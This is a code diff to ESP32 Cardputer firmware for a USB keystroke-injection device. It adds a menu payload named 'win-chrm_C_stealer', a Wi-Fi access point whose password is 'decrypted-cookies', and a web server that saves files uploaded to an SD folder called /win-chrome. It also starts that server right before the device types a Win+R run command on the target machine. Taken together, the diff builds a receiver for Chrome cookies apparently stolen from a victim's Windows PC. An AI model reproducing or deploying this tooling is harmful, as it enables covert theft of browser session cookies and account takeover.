@@ -5,11 +5,19 @@
 #include <WiFiClientSecure.h>
 #include "USB.h"
 #include "USBHIDKeyboard.h"
+#include <ESPAsyncWebServer.h>
 USBHIDKeyboard Keyboard;
 const int buttonPin = 0;
 bool screen_dim_dimmedL = false;
 int screen_dim_timeL = 30;
 int screen_dim_currentL = 0;
+String full_files_dir = "/win-chrome/";
+String files_dir = "/win-chrome";
+String ssid = String("AP-0");
+String password = String("decrypted-cookies");
+File root;
+
+AsyncWebServer server(80);
 
 struct MENUL {
   char name[19];
@@ -54,7 +62,9 @@ void demo_windows(){ // 5
 
 static MENUL bumenu[] = { // edit this to add payloads!
   { TXT_BACK, 0},
+  #if defined(CARDPUTER)
   { "win-chrm_C_stealer", 1},
+  #endif
   { "demo_android", 2},
   { "demo_ios", 3},
   { "demo_macos", 4},
@@ -140,6 +150,109 @@ bool check_select_pressL(){
   }
 #endif
   return false;
+}
+
+String printDirectory_listing(File dir, int numTabs) {
+  String response = "";
+  dir.rewindDirectory();
+  
+  while(true) {
+     File entry =  dir.openNextFile();
+     if (!entry) {
+       // no more files
+       //Serial.println("**nomorefiles**");
+       break;
+     }
+     for (uint8_t i=0; i<numTabs; i++) {
+       Serial.print('\t');   // we'll have a nice indentation
+     }
+     // Recurse for directories, otherwise print the file size
+     if (entry.isDirectory()) {
+       printDirectory_listing(entry, numTabs+1);
+     } else {
+       response += String("<a href='") + String(entry.name()) + String("'>") + String(entry.name()) + String("</a>") + String("</br>");
+     }
+     entry.close();
+   }
+
+   return String("List files in <b>/</b>win-chrome:<br>") + response;
+}
+
+String filename_exists(String filename, int count, String filename_original){
+  if(SD.exists(full_files_dir+filename)){
+    count++;
+    char snum[5];
+    // Convert 123 to string [buf]
+    itoa(count, snum, 10);
+    return filename_exists(snum+String("-")+filename_original, count, filename_original);
+  } else {
+    return filename;
+  }
+}
+
+void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
+  String logmessage = "Client:" + request->client()->remoteIP().toString() + " " + request->url();
+  Serial.println(logmessage);
+  String filename_copy = filename;
+  if (!index) {
+    String toUpload = filename_exists(filename, 0, filename);
+    logmessage = "Upload Start: " + String(filename);
+    // open the file on first call and store the file handle in the request object
+    request->_tempFile = SD.open(full_files_dir+toUpload, FILE_WRITE);
+    Serial.println(logmessage);
+  }
+
+  if (len) {
+    // stream the incoming chunk to the opened file
+    request->_tempFile.write(data, len);
+    logmessage = "Writing file: " + String(filename) + " index=" + String(index) + " len=" + String(len);
+    Serial.println(logmessage);
+  }
+
+  if (final) {
+    logmessage = "Upload Complete: " + String(filename) + ",size: " + String(index + len);
+    // close the file handle as the upload is now done
+    request->_tempFile.close();
+    Serial.println(logmessage);
+    request->redirect("/");
+  }
+}
+
+void runPayloadServer(){
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(ssid, password);
+  IPAddress IP = WiFi.softAPIP();
+  DISP.println("AP: "+ssid);
+  DISP.println("PSW: "+password);
+  //DISP.println(IP);
+  // Connect to Wi-Fi
+  /*WiFi.begin(ssid, password, WIFI_CHANNEL);
+  while (WiFi.status() != WL_CONNECTED)
+  {
+    delay(1000);
+    Serial.println("Connecting to WiFi...");
+  }
+  Serial.println("Connected to WiFi");
+  Serial.print("HTTP server started at http://");
+  Serial.println(WiFi.localIP());*/
+  server.serveStatic("/", SD, full_files_dir.c_str());
+  // Serve the HTML file as the default route
+  server.on("/", [](AsyncWebServerRequest *request){
+    root = SD.open(files_dir);
+    String res = printDirectory_listing(root, 0);
+    request->send(200, "text/html", res);
+  });
+
+  // Route to handle file upload
+  server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request) {
+        request->send(200);
+      }, handleUpload);
+  // Start server
+  server.begin();
+
+  DISP.println("HTTP server started");
+  DISP.print("@ http://");
+  DISP.print(IP);
 }
 
 void drawmenuL() {
@@ -282,8 +395,8 @@ void rootPayload0(){
         }
         if(exists && sz == PYLD_EXP_SIZE){
           // run payload
-          current_proc = 25;
-          //current_proc = 27;
+          //current_proc = 25;
+          current_proc = 27;
         } else {
           current_proc = 25;
         }
@@ -467,8 +580,10 @@ void run_payload_setup(){
   USB.begin();
   DISP.fillScreen(BGCOLOR);
   DISP.setCursor(0, 0);
+  runPayloadServer();
   DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.println("Runing payload...");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
   delay(2000);   
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
@@ -478,7 +593,7 @@ void run_payload_setup(){
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(1000);
-  Keyboard.print("echo 'I am typing!'");
+  Keyboard.print("echo 'Keystrokes injection...'");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
 
